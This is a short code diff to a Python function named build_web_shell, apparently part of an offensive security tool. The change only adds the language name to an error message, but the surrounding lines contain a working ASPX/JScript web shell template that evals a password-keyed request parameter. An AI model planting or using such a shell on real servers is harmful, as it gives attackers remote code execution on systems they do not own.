@@ -109,5 +109,5 @@ def build_web_shell(lang='php') -> tuple:
         code = '<%@ Page Language="Jscript"%><%eval(Request.Item["{}"],"unsafe");%>'.format(password)
         flag = 'Response.Write("{}")'.format(password)
     else:
-        raise Exception(f'Unusable language')
+        raise Exception(f'Unusable language {lang}')
     return code, password, flag
